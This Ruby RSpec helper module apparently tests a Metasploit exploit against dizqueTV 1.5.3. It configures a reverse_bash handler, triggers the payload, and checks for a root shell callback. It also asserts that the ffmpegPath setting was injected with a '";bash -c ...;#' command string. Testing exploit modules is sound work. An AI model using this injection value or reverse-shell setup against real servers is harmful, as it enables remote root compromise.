# frozen_string_literal: true

require 'csv'
require_relative '../laravel/sessions'
require_relative '../dizquetv/acceptance'

# Stock shell readiness precedes independent API and original owner delivery.
module DizquetvSessions
  include LaravelSessions
  include DizquetvTarget

  def laravel_component
    'dizquetv'
  end

  def laravel_owner
    DizquetvTarget::OWNER
  end

  def laravel_uid
    0
  end

  def session_control_name
    'DizquetvSessionControl'
  end

  def session_families
    { 'bash-shell' => [0, 'cmd/unix/reverse_bash', 'shell'] }
  end

  def session_default_options
    { 'bash-shell' => ['TARGET'] }
  end

  def session_health_path
    '/'
  end

  def session_owner_options(options)
    options.except('HttpClientTimeout')
  end

  def rc_resource_roles
    %w[target reporting_db]
  end

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'dizquetv-sessions.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def ds_argv(action, *arguments)
    ['python3', '-B', 'test/module_targets/dizquetv_sessions/native_probe.py', action, *arguments]
  end

  def ds_native(action, *)
    argv = ds_argv(action, *)
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { action: 'session-' + action, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def file(path)
    value = ds_native('file', path)
    @rc[:files] << { path: path, value: value }
    value
  end

  def process_state
    state = ds_native('state', LaravelSessions::CALLBACK_PORT.to_s)
    state.fetch('processes').reject! do |row|
      row.fetch('command') == session_health_command || row.values_at('uid', 'ppid', 'command') == ['0', 0, 'runc init']
    end
    state
  end

  def ds_registry
    expect(dq_native('snapshot')).to eq(@rc.fetch(:readiness).fetch('baseline'))
  end

  def idle
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    expect(session_rows).to all(include('closed_at' => be_a(String))) if @workspace
    state = process_state
    @rc[:states] << { phase: 'idle', state: state }
    rc_save
    expect(state.fetch('connections')).to eq([])
    # The app can accept unrelated health sockets without changing identity.
    expect(state.fetch('processes').map { |row| row.except('state', 'connection_inodes') }).to eq(@baseline.fetch('processes').map { |row| row.except('state', 'connection_inodes') })
    true
  end

  def callback_control
    server = TCPServer.new('0.0.0.0', LaravelSessions::CALLBACK_PORT)
    token = 'dizquetv-' + Rex::Text.rand_text_alphanumeric(24)
    task = Thread.new { Open3.capture3(*session_exec_argv('perl', '/opt/module-target-dizquetv-observe.pl', 'callback', token, LaravelSessions::CALLBACK_PORT.to_s)) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native dizqueTV callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    line = Timeout.timeout(5) { peer.gets }
    fields = CSV.parse_line(line, col_sep: "\t")
    expect(fields.length).to eq(5)
    identity = { 'token' => fields[0], 'uid' => Integer(fields[1], 10), 'pid' => Integer(fields[2], 10), 'ppid' => Integer(fields[3], 10), 'host' => fields[4] }
    expect(identity).to include('token' => token, 'uid' => 0)
    state = process_state
    process = state.fetch('processes').find { |row| row.fetch('pid') == identity.fetch('pid') }
    expect(process).to include('uid' => '0', 'ppid' => identity.fetch('ppid'), 'birth' => be_a(String))
    connected = state.fetch('connections').select { |row| row.fetch('state') == '01' }.map { |row| row.fetch('inode') }
    expect(process.fetch('connection_inodes') & connected).not_to be_empty
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    @rc[:callback].merge!(stdout: output, stderr: error, exit: status.exitstatus)
    expect(status.success?).to be(true), error
    expect(output).to eq(line)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def os_ready
    @rc[:readiness] = dq_native('before')
    expect(@rc.fetch(:readiness)).to include('passed' => true, 'version' => '1.5.3', 'module_invoked' => false)
    rc_command('stock-bash', 'target', 'sh', '-c', 'command -v bash')
    rc_resources('before')
    @rc[:observer] = rc_json("begin;load 'test/module_targets/dizquetv/observe.rb';DizquetvObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @baseline = process_state
    expect(@baseline.fetch('connections')).to eq([])
    callback_control
    endpoint = target_endpoint('reporting_db')
    expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
    @ready = rc_json("begin;load 'test/module_targets/dizquetv_sessions/session_control.rb';DizquetvSessionControl.install(framework);end")
    @rc[:session_context] = { baseline: @baseline, listener_host: @listener_host, ready: @ready }
    @rc[:prepared] = true
    ds_registry
  end

  def native_session(family)
    super
    source = "/tmp/module-target-#{laravel_component}-native-#{Process.pid}-#{family}"
    expect(file(source)).to eq('exists' => false)
    expect(file(source + '-output')).to eq('exists' => false)
  rescue StandardError, RSpec::Expectations::ExpectationNotMetError
    @rc[:calibrated].delete(family)
    raise
  end

  def native_api_session
    payload = session_families.fetch('bash-shell')[1]
    attempt = { family: 'bash-shell', route: 'native-api', owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60 }.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    attempt[:generated] = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;{payload:job.ctx[1].refname,encoded:Base64.strict_encode64(job.ctx.first.payload.encoded)};end")
    expect(attempt.fetch(:generated).fetch('payload')).to eq(payload)
    attempt[:armed] = ds_native('arm', attempt.fetch(:generated).fetch('encoded'))
    input, output, error, waiter = Open3.popen3(*ds_argv('trigger'))
    input.close
    attempt[:trigger_pid] = waiter.pid
    await_session(payload, 'exploit/multi/handler')
    # Restore through the independent API while the foreground shell remains
    # live, before its pending version request has completed.
    attempt[:restored_while_live] = ds_native('restore')
    expect(waiter.join(0)).to be_nil
    use_session('bash-shell', attempt, 'exploit/multi/handler')
    status = Timeout.timeout(20) { waiter.value }
    attempt[:trigger] = { exit: status.exitstatus, stdout: output.read, stderr: error.read }
    expect(status.success?).to be(true), attempt.fetch(:trigger).fetch(:stderr)
    expect(JSON.parse(attempt.fetch(:trigger).fetch(:stdout))).to include('status' => 200)
    @rc[:api_calibrated] = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      ds_native('restore') if attempt[:armed]
      cleanup_session
      if waiter && !waiter.join(5)
        Process.kill('TERM', waiter.pid)
        unless waiter.join(5)
          Process.kill('KILL', waiter.pid)
          raise IOError, 'Native trigger process did not exit' unless waiter.join(5)
        end
      end
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      [input, output, error].compact.each { |stream| stream.close unless stream.closed? }
      rc_save
    end
  end

  def use_session(family, attempt, owner)
    ds_registry
    if owner == laravel_owner
      offset = @rc.fetch(:event_cursor, 0)
      attempt[:events] = rc_json('framework.instance_variable_get(:@dizquetv_events)').drop(offset)
      @rc[:event_cursor] = rc_json('framework.instance_variable_get(:@dizquetv_events).length')
      attempt[:defaults] = rc_json('{target:active_module.target_index,command:active_module.datastore["COMMAND"],payload:active_module.datastore["PAYLOAD"]}')
      expect(attempt.fetch(:defaults)).to eq('target' => 0, 'command' => '', 'payload' => session_families.fetch(family)[1])
      events = attempt.fetch(:events)
      expect(events.count { |row| row['owner_exploit_body'] }).to eq(1)
      commands = events.filter_map { |row| row['command_base64'] }
      expect(commands.length).to eq(1)
      expect(Base64.strict_decode64(commands.first)).to start_with('bash -c ')
      puts = events.filter_map { |row| row['request'] }.select { |row| row['method'] == 'PUT' }
      expect(puts.length).to eq(2)
      expect(JSON.parse(Base64.strict_decode64(puts.first.fetch('data_base64'))).fetch('ffmpegPath')).to eq('";' + Base64.strict_decode64(commands.first) + ';#')
      expect(JSON.parse(Base64.strict_decode64(puts.last.fetch('data_base64')))).to eq(@rc.fetch(:readiness).fetch('baseline').fetch('settings'))
      expect(events.filter_map { |row| row['original_settings_cleared'] }).to eq([true])
      expect(events.select { |row| row['event'] == 'call' && row['method'] == 'upload_script' }).to eq([])
    end
    super
    process = attempt.fetch(:live_state).fetch('processes').find { |row| row.fetch('pid') == attempt.fetch(:proof).fetch('pid') }
    connections = attempt.fetch(:live_state).fetch('connections').select { |row| row.fetch('state') == '01' }
    expect(connections.length).to eq(1)
    expect(process.fetch('connection_inodes')).to include(connections.first.fetch('inode'))
    ds_registry
  ensure
    rc_save
  end
end
